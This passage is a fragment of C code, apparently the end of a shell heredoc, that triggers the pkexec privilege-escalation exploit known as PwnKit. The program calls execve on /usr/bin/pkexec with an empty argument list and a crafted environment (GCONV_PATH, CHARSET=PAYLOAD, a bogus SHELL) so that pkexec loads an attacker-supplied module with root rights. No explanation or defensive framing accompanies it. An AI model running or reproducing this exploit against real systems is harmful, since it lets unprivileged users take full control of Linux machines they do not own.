...
int main(int argc, char* argv[]){
  puts("[*] Attempting to execve pkexec...");
  
  char* _newenvparray[] = {"target=a", "PATH=GCONV_PATH=.", "CHARSET=PAYLOAD","SHELL=/etc/lasdasd", NULL};
  execve("/usr/bin/pkexec", 0, _newenvparray);
}
EOF
